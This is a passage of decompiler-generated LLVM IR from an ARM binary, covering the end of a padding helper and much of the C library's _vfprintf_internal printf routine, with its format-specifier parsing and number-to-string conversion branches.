  store i32 %v0_13a64, i32* %r0.global-to-local, align 4
  %v3_13a6c = trunc i32 %v1_13a60 to i8
  %v4_13a6c = call i32 @_charpad(i32 %v0_13a64, i8 %v3_13a6c, i32 %v2_13a48)
  store i32 %v4_13a6c, i32* %r0.global-to-local, align 4
  %v1_13a70 = load i32, i32* @r4, align 4
  %v9_13a70 = icmp eq i32 %v4_13a6c, %v1_13a70
  store i32 %v4_13a6c, i32* %r6.global-to-local, align 4
  br i1 %v9_13a70, label %dec_label_pc_13a7c, label %dec_label_pc_13a9c

dec_label_pc_13a7c:                               ; preds = %dec_label_pc_13a60
  %v0_13a7c = load i32, i32* @r5, align 4
  store i32 %v0_13a7c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a80

dec_label_pc_13a80:                               ; preds = %bb, %.thread, %dec_label_pc_13a7c
  %v5_13a8c = phi i32 [ %v0_13a7c, %dec_label_pc_13a7c ], [ %arg3, %bb ], [ %v3_13a44, %.thread ]
  %tmp17 = icmp slt i32 %v5_13a8c, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_13a80
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_13a80
  %v5_13a88 = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_13a88, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_177d4.886 to i32))
  %v0_13a98 = load i32, i32* %r6.global-to-local, align 4
  %v2_13a98 = add i32 %storemerge, %v0_13a98
  store i32 %v2_13a98, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13a9c

dec_label_pc_13a9c:                               ; preds = %dec_label_pc_13a60, %bb19
  %v0_13a9c = phi i32 [ %v4_13a6c, %dec_label_pc_13a60 ], [ %v2_13a98, %bb19 ]
  store i32 %v0_13a9c, i32* %r0.global-to-local, align 4
  %v2_13aa0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13aa0, i32* %r4.global-to-local, align 4
  store i32 %v9_13a20, i32* %r6.global-to-local, align 4
  ret i32 %v0_13a9c

; uselistorder directives
  uselistorder i32 %v0_13a9c, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_13a9c, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_13a80, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13aa4 = load i32, i32* @r4, align 4
  store i32 %v3_13aa4, i32* %stack_var_-36, align 4
  %v6_13aa4 = load i32, i32* @r5, align 4
  %v15_13aa4 = load i32, i32* @r8, align 4
  %v18_13aa4 = load i32, i32* @sb, align 4
  %v21_13aa4 = load i32, i32* @sl, align 4
  %v24_13aa4 = load i32, i32* @fp, align 4
  %v2_13aac = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_13aac, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_13aac, i32* %r0.global-to-local, align 4
  %v0_13ab8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_13ab8, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_13ac0 = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_13ac0, i32* %r0.global-to-local, align 4
  %v1_13ac4 = icmp slt i32 %v2_13ac0, 0
  br i1 %v1_13ac4, label %dec_label_pc_13acc, label %dec_label_pc_13b00

dec_label_pc_13acc:                               ; preds = %entry
  %v3_13acc = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_13acc, i32* @r4, align 4
  %v1_13ad0 = inttoptr i32 %v3_13acc to i8*
  store i32 %v3_13acc, i32* %r0.global-to-local, align 4
  %v3_13ad4 = call i32 @strlen(i8* %v1_13ad0)
  store i32 %v3_13ad4, i32* %r0.global-to-local, align 4
  %v2_13ad8 = icmp eq i32 %v3_13ad4, 0
  br i1 %v2_13ad8, label %bb, label %dec_label_pc_13ae8

bb:                                               ; preds = %dec_label_pc_13acc
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14078

dec_label_pc_13ae8:                               ; preds = %dec_label_pc_13acc
  %v0_13ae8 = load i32, i32* @r4, align 4
  store i32 %v0_13ae8, i32* %r0.global-to-local, align 4
  %v0_13aec = load i32, i32* @fp, align 4
  store i32 %v0_13aec, i32* %r2.global-to-local, align 4
  %v3_13af0 = call i32 @__stdio_fwrite(i32 %v0_13ae8, i32 %v3_13ad4, i32 %v0_13aec)
  store i32 %v3_13af0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14078

dec_label_pc_13b00:                               ; preds = %entry
  store i32 %v2_13aac, i32* %r0.global-to-local, align 4
  %v0_13b04 = load i32, i32* @r5, align 4
  %v2_13b08 = call i32 @_ppfs_prepargs(i32 %v2_13aac, i32 %v0_13b04)
  store i32 %v2_13b08, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_13ba8 = zext i8 %tmp104 to i32
  %v2_13bb0 = ptrtoint i32* %stack_var_-252 to i32
  %v2_13bd0 = ptrtoint i32* %stack_var_-36 to i32
  %v2_13be8 = icmp eq i32 %tmp102, 0
  %v1_13bfc = inttoptr i32 %tmp101 to i32*
  %v2_13eec = ptrtoint i32* %stack_var_-180 to i32
  %v2_13e08 = ptrtoint i32* %stack_var_-44 to i32
  %v2_13e1c = ptrtoint i32* %stack_var_-52 to i32
  %v3_13db8 = add i32 %tmp101, 4
  %v4_13db8 = inttoptr i32 %v3_13db8 to i32*
  %v2_13dbc = ptrtoint i32* %stack_var_-328 to i32
  %v7_13c7c = zext i8 %tmp99 to i32
  %v2_13cb8 = ptrtoint i32* %stack_var_-53 to i32
  %v5_13cc0 = bitcast i32* %stack_var_-53 to i8*
  %v2_13cc8 = icmp ugt i32 %tmp102, 4
  %v7_13cc8 = icmp eq i32 %tmp102, 5
  %v0_14060.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_13be0187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_13ddc = icmp ugt i32 %tmp102, 16
  %v7_13ddc = icmp eq i32 %tmp102, 17
  %v2_13de0 = xor i1 %v7_13ddc, true
  %v3_13de0 = and i1 %v2_13ddc, %v2_13de0
  %v2_13e7c = icmp ugt i32 %tmp102, 18
  %v7_13e7c = icmp eq i32 %tmp102, 19
  %v2_13e80 = xor i1 %v7_13e7c, true
  %v3_13e80 = and i1 %v2_13e7c, %v2_13e80
  %v7_13ee0 = icmp eq i32 %tmp102, 20
  %v2_13c20 = add i32 %tmp102, ptrtoint (i32* @global_var_1d268.888 to i32)
  %v1_13c24 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_1d268.888 to i32), i32 -1)
  %v2_13c24 = inttoptr i32 %v1_13c24 to i8*
  %v2_13c50 = xor i1 %v7_13cc8, true
  %v3_13c50 = and i1 %v2_13cc8, %v2_13c50
  %v7_13c84 = icmp eq i32 %tmp102, 1
  %v2_13cd0 = xor i1 %v2_13cc8, true
  %v3_13cd0 = or i1 %v7_13cc8, %v2_13cd0
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_13d38 = icmp eq i32 %tmp102, 3
  %v11_13d44 = icmp eq i32 %tmp102, 4
  %v9_13bb4 = mul nuw nsw i32 %v4_13ba8, 8
  %v10_13bb4 = add nsw i32 %v9_13bb4, -8
  %v6_13bbc = add i32 %v10_13bb4, %v2_13bb0
  br label %dec_label_pc_14060

bb126:                                            ; preds = %dec_label_pc_13b18.outer, %.thread7
  %v2_13b18185 = phi i8 [ %v2_13b18, %.thread7 ], [ %v2_13b18181, %dec_label_pc_13b18.outer ]
  %v1_13b2c184 = phi i32 [ %v2_13b2c, %.thread7 ], [ %v0_13b1849, %dec_label_pc_13b18.outer ]
  %v8_13b20 = icmp eq i8 %v2_13b18185, 37
  br i1 %v8_13b20, label %dec_label_pc_13b34, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_13b2c = add i32 %v1_13b2c184, 1
  store i32 %v2_13b2c, i32* @r4, align 4
  %v1_13b18 = inttoptr i32 %v2_13b2c to i8*
  %v2_13b18 = load i8, i8* %v1_13b18, align 1
  %v3_13b18 = zext i8 %v2_13b18 to i32
  store i32 %v3_13b18, i32* %r3.global-to-local, align 4
  %v2_13b1c = icmp eq i8 %v2_13b18, 0
  br i1 %v2_13b1c, label %dec_label_pc_13b34, label %bb126

dec_label_pc_13b34:                               ; preds = %bb126, %.thread7, %dec_label_pc_13b18.outer
  %v1_13b2c.lcssa = phi i32 [ %v0_13b1849, %dec_label_pc_13b18.outer ], [ %v2_13b2c, %.thread7 ], [ %v1_13b2c184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13b34 = sub i32 %v1_13b2c.lcssa, %v5_13b44
  %v9_13b34 = icmp eq i32 %v1_13b2c.lcssa, %v5_13b44
  br i1 %v9_13b34, label %dec_label_pc_13b68, label %dec_label_pc_13b3c

dec_label_pc_13b3c:                               ; preds = %dec_label_pc_13b34
  store i32 %v2_13b34, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_13b34, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_13b3c
  store i32 %v5_13b44, i32* %r0.global-to-local, align 4
  %v5_13b4c = load i32, i32* @fp, align 4
  store i32 %v5_13b4c, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_13b3c, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_13b3c ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_177d4.886 to i32))
  %v0_13b54 = load i32, i32* %r0.global-to-local, align 4
  %v1_13b54 = load i32, i32* @r5, align 4
  %v9_13b54 = icmp eq i32 %v0_13b54, %v1_13b54
  br i1 %v9_13b54, label %dec_label_pc_13b5c, label %dec_label_pc_14070

dec_label_pc_13b5c:                               ; preds = %bb130
  %v2_13b60 = add i32 %v0_13b54, %stack_var_-336.1.ph
  %v0_13b68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13b68

dec_label_pc_13b68:                               ; preds = %dec_label_pc_13b34, %dec_label_pc_13b5c
  %v0_13b7c = phi i32 [ %v5_13b44, %dec_label_pc_13b34 ], [ %v0_13b68.pre, %dec_label_pc_13b5c ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_13b34 ], [ %v2_13b60, %dec_label_pc_13b5c ]
  %v1_13b68 = inttoptr i32 %v0_13b7c to i8*
  %v2_13b68 = load i8, i8* %v1_13b68, align 1
  %v3_13b68 = zext i8 %v2_13b68 to i32
  store i32 %v3_13b68, i32* %r3.global-to-local, align 4
  %v2_13b6c = icmp eq i8 %v2_13b68, 0
  br i1 %v2_13b6c, label %dec_label_pc_14078, label %dec_label_pc_13b74

dec_label_pc_13b74:                               ; preds = %dec_label_pc_13b68
  %v1_13b74 = add i32 %v0_13b7c, 1
  %v2_13b74 = inttoptr i32 %v1_13b74 to i8*
  %v3_13b74 = load i8, i8* %v2_13b74, align 1
  %v4_13b74 = zext i8 %v3_13b74 to i32
  store i32 %v4_13b74, i32* %r3.global-to-local, align 4
  %v7_13b78 = icmp eq i8 %v3_13b74, 37
  store i32 %v1_13b74, i32* %r2.global-to-local, align 4
  br i1 %v7_13b78, label %dec_label_pc_14068, label %dec_label_pc_13b84

dec_label_pc_13b84:                               ; preds = %dec_label_pc_13b74
  store i32 %v2_13aac, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_13aac, i32* %r0.global-to-local, align 4
  store i32 %v1_13b74, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_13b98 = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_13aac, i32* @r0, align 4
  %v0_13ba0 = call i32 @_ppfs_setargs()
  store i32 %v0_13ba0, i32* %r0.global-to-local, align 4
  store i32 %v4_13ba8, i32* %ip.global-to-local, align 4
  store i32 %v2_13bb0, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_13b84
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_13b84
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_13bbc, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_13bc878 = phi i32 [ %v6_13bbc, %bb133 ], [ %v2_13bb0, %.thread ]
  store i32 %v2_13bd0, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_13be0187, label %dec_label_pc_13bc8, label %dec_label_pc_13be4

dec_label_pc_13bc8:                               ; preds = %bb134, %dec_label_pc_13bc8
  %v5_13bd8189 = phi i32 [ %v5_13bd8, %dec_label_pc_13bc8 ], [ %v2_13bd0, %bb134 ]
  %v0_13bc8188 = phi i32 [ %v1_13bcc, %dec_label_pc_13bc8 ], [ %v0_13bc878, %bb134 ]
  %v2_13bc8 = add i32 %v5_13bd8189, -4
  %v3_13bc8 = inttoptr i32 %v2_13bc8 to i32*
  store i32 %v0_13bc8188, i32* %v3_13bc8, align 4
  %v0_13bcc = load i32, i32* %r3.global-to-local, align 4
  %v1_13bcc = add i32 %v0_13bcc, 8
  store i32 %v1_13bcc, i32* %r3.global-to-local, align 4
  %v0_13bd4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13bd4.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_13bd0, i32* @lr, align 4
  %v4_13bd8 = mul i32 %v0_13bd4.pre, 4
  %v5_13bd8 = add i32 %v4_13bd8, %v2_13bd0
  %v1_13bdc = add i32 %v0_13bd4.pre, 1
  store i32 %v1_13bdc, i32* %r2.global-to-local, align 4
  %v5_13be0 = icmp slt i32 %v0_13bd4.pre, %v1_13bd4.pre
  br i1 %v5_13be0, label %dec_label_pc_13bc8, label %dec_label_pc_13be4

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13bc8, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_13be8, label %dec_label_pc_13bf0, label %dec_label_pc_13c14

dec_label_pc_13bf0:                               ; preds = %dec_label_pc_13be4
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* %ip.global-to-local, align 4
  %v2_13bfc = load i32, i32* %v1_13bfc, align 4
  store i32 %v2_13bfc, i32* %r0.global-to-local, align 4
  %v1_13c00 = and i32 %v0_13c44, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_13c08 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_13c08, i32* %r3.global-to-local, align 4
  %v4_13c0c = inttoptr i32 %v2_13bfc to i8*
  %v5_13c0c = call i32 @_store_inttype(i8* %v4_13c0c, i32 %v1_13c00, i32 %stack_var_-336.2, i32 %v3_13c08)
  store i32 %v5_13c0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1405c

dec_label_pc_13c14:                               ; preds = %dec_label_pc_13be4
  br i1 %tmp195, label %dec_label_pc_13da0, label %dec_label_pc_13c1c

dec_label_pc_13c1c:                               ; preds = %dec_label_pc_13c14
  store i32 %v2_13c20, i32* %r3.global-to-local, align 4
  %v3_13c24 = load i8, i8* %v2_13c24, align 1
  %v4_13c24 = zext i8 %v3_13c24 to i32
  store i32 %v4_13c24, i32* @r4, align 4
  %v7_13c28 = icmp eq i8 %v3_13c24, 10
  br i1 %v7_13c28, label %dec_label_pc_13c34, label %bb135

bb135:                                            ; preds = %dec_label_pc_13c1c
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_13c34:                               ; preds = %dec_label_pc_13c1c
  store i32 %v0_13c44, i32* %r3.global-to-local, align 4
  %v1_13c38 = and i32 %v0_13c44, 32
  %v2_13c38 = icmp eq i32 %v1_13c38, 0
  %.175 = select i1 %v2_13c38, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_13c44 = and i32 %v0_13c44, 64
  %v2_13c44 = icmp eq i32 %v1_13c44, 0
  br i1 %v2_13c44, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_13c34
  %.176 = select i1 %v2_13c38, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_13c34, %bb138
  br i1 %v3_13c50, label %.thread84, label %dec_label_pc_13c58

.thread84:                                        ; preds = %bb139
  %v5_13c50 = sub nsw i32 0, %v4_13c24
  store i32 %v5_13c50, i32* @r4, align 4
  br label %dec_label_pc_13c70

dec_label_pc_13c58:                               ; preds = %bb139
  br i1 %v7_13d38, label %bb140, label %dec_label_pc_13c64

bb140:                                            ; preds = %dec_label_pc_13c58
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_13c70

dec_label_pc_13c64:                               ; preds = %dec_label_pc_13c58
  br i1 %v7_13c84, label %dec_label_pc_13c74, label %dec_label_pc_13c70

dec_label_pc_13c70:                               ; preds = %.thread84, %bb140, %dec_label_pc_13c64
  %v0_13c9c86 = phi i32 [ %v5_13c50, %.thread84 ], [ %v4_13c24, %bb140 ], [ %v4_13c24, %dec_label_pc_13c64 ]
  br label %dec_label_pc_13c74

dec_label_pc_13c74:                               ; preds = %dec_label_pc_13c64, %dec_label_pc_13c70
  %v0_13c9c85 = phi i32 [ %v0_13c9c86, %dec_label_pc_13c70 ], [ %v4_13c24, %dec_label_pc_13c64 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_13c70 ], [ 6, %dec_label_pc_13c64 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_13c74 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_13c74, i32* %r3.global-to-local, align 4
  %v1_13c78 = icmp slt i32 %v3_13c74, 0
  %v7_13c7c. = select i1 %v1_13c78, i32 %v7_13c7c, i32 32
  store i32 %v7_13c7c., i32* @sb, align 4
  br i1 %v7_13c84, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_13c74
  store i32 %v2_13bd0, i32* @lr, align 4
  %v2_13c8c = load i32, i32* %ip.global-to-local, align 4
  %v5_13c8c = mul i32 %v2_13c8c, 4
  %v6_13c8c = add i32 %v5_13c8c, %v2_13bd0
  store i32 %v6_13c8c, i32* %r3.global-to-local, align 4
  %v2_13c90 = add i32 %v6_13c8c, -260
  %v3_13c90 = inttoptr i32 %v2_13c90 to i32*
  %v4_13c90 = load i32, i32* %v3_13c90, align 4
  store i32 %v4_13c90, i32* %r3.global-to-local, align 4
  %v2_13c98 = and i32 %v4_13c90, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_13c74, %.thread16
  %storemerge94 = phi i32 [ %v2_13c98, %.thread16 ], [ 1024, %dec_label_pc_13c74 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_13c9c85, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_13ca4 = call i32 @_load_inttype()
  %v0_13ca8 = load i32, i32* @r1, align 4
  store i32 %v0_13ca8, i32* %r2.global-to-local, align 4
  %v0_13cb4 = load i32, i32* @r4, align 4
  store i32 %v0_13cb4, i32* %r3.global-to-local, align 4
  store i32 %v2_13cb8, i32* %r0.global-to-local, align 4
  %v0_13cbc = load i32, i32* @r5, align 4
  %v6_13cc0 = call i32 @_uintmaxtostr(i8* %v5_13cc0, i32 %v0_13ca4, i32 %v0_13ca8, i32 %v0_13cb4, i32 %v0_13cbc)
  store i32 %v6_13cc0, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_13cc0, i32* @r6, align 4
  br i1 %v3_13cd0, label %bb148, label %dec_label_pc_13cd4

dec_label_pc_13cd4:                               ; preds = %bb145
  %v7_13cc0 = inttoptr i32 %v6_13cc0 to i8*
  %v3_13cd4 = load i8, i8* %v7_13cc0, align 1
  %v7_13cd8 = icmp eq i8 %v3_13cd4, 45
  %v2_13ce0 = or i32 %v0_13c44, 2
  %v2_13ce0.stack_var_-316.4 = select i1 %v7_13cd8, i32 %v2_13ce0, i32 %v0_13c44
  store i32 %v2_13ce0.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_13cd8, label %.thread18, label %dec_label_pc_13cf4

.thread18:                                        ; preds = %dec_label_pc_13cd4
  %v3_13ce4 = add i32 %v6_13cc0, 1
  store i32 %v3_13ce4, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_13cf4:                               ; preds = %dec_label_pc_13cd4
  %v1_13cf4 = and i32 %v2_13ce0.stack_var_-316.4, 2
  %v2_13cf4 = icmp eq i32 %v1_13cf4, 0
  br i1 %v2_13cf4, label %dec_label_pc_13d00, label %bb146

bb146:                                            ; preds = %dec_label_pc_13cf4
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_13d00:                               ; preds = %dec_label_pc_13cf4
  %v1_13d00 = urem i32 %v2_13ce0.stack_var_-316.4, 2
  %v2_13d00 = icmp eq i32 %v1_13d00, 0
  br i1 %v2_13d00, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_13d00
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_13d00, %bb147
  %v0_13d5c = phi i32 [ %v6_13cc0, %bb145 ], [ %v3_13ce4, %.thread18 ], [ %v6_13cc0, %dec_label_pc_13d00 ], [ %v6_13cc0, %bb147 ], [ %v6_13cc0, %bb146 ]
  %v0_13d18 = phi i32 [ %v0_13c44, %bb145 ], [ %v2_13ce0, %.thread18 ], [ %v0_13c44, %dec_label_pc_13d00 ], [ %v0_13c44, %bb147 ], [ %v0_13c44, %bb146 ]
  %v3_13d08 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_13d08, i32* %r2.global-to-local, align 4
  store i32 %v0_13d18, i32* %r3.global-to-local, align 4
  %v1_13d10 = icmp slt i32 %v3_13d08, 0
  br i1 %v1_13d10, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_13d40 = phi i32 [ %v3_13d08, %bb148 ], [ 1, %bb149 ]
  %v1_13d18 = and i32 %v0_13d18, 16
  %v2_13d18 = icmp eq i32 %v1_13d18, 0
  store i32 %v2_13eec, i32* %r3.global-to-local, align 4
  %v2_13d20 = sub i32 %v2_13eec, %v0_13d5c
  %v1_13d24 = add i32 %v2_13d20, 127
  store i32 %v1_13d24, i32* @r5, align 4
  br i1 %v2_13d18, label %bb157, label %dec_label_pc_13d2c

dec_label_pc_13d2c:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_13d2c
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_13d2c, %bb151
  br i1 %v7_13d38, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_13d40, %v1_13d24
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_13d44, label %dec_label_pc_13d4c, label %bb157

dec_label_pc_13d4c:                               ; preds = %bb155
  %v1_13d4c = inttoptr i32 %v0_13d5c to i8*
  %v2_13d4c = load i8, i8* %v1_13d4c, align 1
  %v3_13d4c = zext i8 %v2_13d4c to i32
  store i32 %v3_13d4c, i32* %r3.global-to-local, align 4
  %v7_13d50 = icmp eq i8 %v2_13d4c, 48
  br i1 %v7_13d50, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_13d4c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_13d4c
  %v2_13d58 = add i32 %v2_13d20, 128
  store i32 %v2_13d58, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_13d94 = phi i32 [ %v0_13d40, %bb155 ], [ %v0_13d40, %bb150 ], [ 1, %bb156 ], [ %v2_13d58, %.thread25 ], [ %v0_13d40, %bb154 ]
  %v1_13d5c = inttoptr i32 %v0_13d5c to i8*
  %v2_13d5c = load i8, i8* %v1_13d5c, align 1
  %v3_13d5c = zext i8 %v2_13d5c to i32
  store i32 %v3_13d5c, i32* %r3.global-to-local, align 4
  %v7_13d60 = icmp eq i8 %v2_13d5c, 48
  br i1 %v7_13d60, label %dec_label_pc_13d68, label %dec_label_pc_13d90

dec_label_pc_13d68:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_13d6c = load i32, i32* @r7, align 4
  %v7_13d70 = icmp slt i32 %v0_13d6c, 6
  br i1 %v7_13d70, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_13d68
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_13d68, %bb158
  br i1 %v7_13c84, label %.thread26, label %dec_label_pc_13d84

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_1d24c.890 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_13f04

dec_label_pc_13d84:                               ; preds = %bb159
  %v2_13d84 = icmp eq i32 %v5_13d94, 0
  br i1 %v2_13d84, label %bb160, label %dec_label_pc_13d90

bb160:                                            ; preds = %dec_label_pc_13d84
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13f04

dec_label_pc_13d90:                               ; preds = %dec_label_pc_13d84, %bb157
  %v2_13d90 = sub i32 %v5_13d94, %v1_13d24
  %tmp199 = icmp ugt i32 %v5_13d94, %v1_13d24
  br i1 %tmp199, label %.thread90, label %dec_label_pc_13f04

.thread90:                                        ; preds = %dec_label_pc_13d90
  store i32 %v2_13d90, i32* @r4, align 4
  br label %dec_label_pc_13f20thread-pre-split

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13c14
  br i1 %tmp196, label %dec_label_pc_13ddc, label %dec_label_pc_13da8

dec_label_pc_13da8:                               ; preds = %dec_label_pc_13da0
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_13db4 = load i32, i32* @fp, align 4
  store i32 %v0_13db4, i32* %r0.global-to-local, align 4
  %v2_13db8 = load i32, i32* %v1_13bfc, align 4
  %v5_13db8 = load i32, i32* %v4_13db8, align 4
  store i32 %v5_13db8, i32* %r2.global-to-local, align 4
  store i32 %v2_13dbc, i32* %r3.global-to-local, align 4
  %v6_13dc0 = call i32 @_fpmaxtostr(i32 %v0_13db4, i32 %v2_13db8, i32 %v5_13db8, i32* nonnull %stack_var_-328, i32 80416)
  store i32 %v6_13dc0, i32* %r0.global-to-local, align 4
  %v1_13dc4 = icmp slt i32 %v6_13dc0, 0
  br i1 %v1_13dc4, label %dec_label_pc_14070, label %dec_label_pc_13dcc

dec_label_pc_13dcc:                               ; preds = %dec_label_pc_13da8
  %v2_13dd0 = add i32 %v6_13dc0, %stack_var_-336.2
  store i32 %v2_13dd0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1405c

dec_label_pc_13ddc:                               ; preds = %dec_label_pc_13da0
  br i1 %v3_13de0, label %dec_label_pc_13e7c, label %dec_label_pc_13de4

dec_label_pc_13de4:                               ; preds = %dec_label_pc_13ddc
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
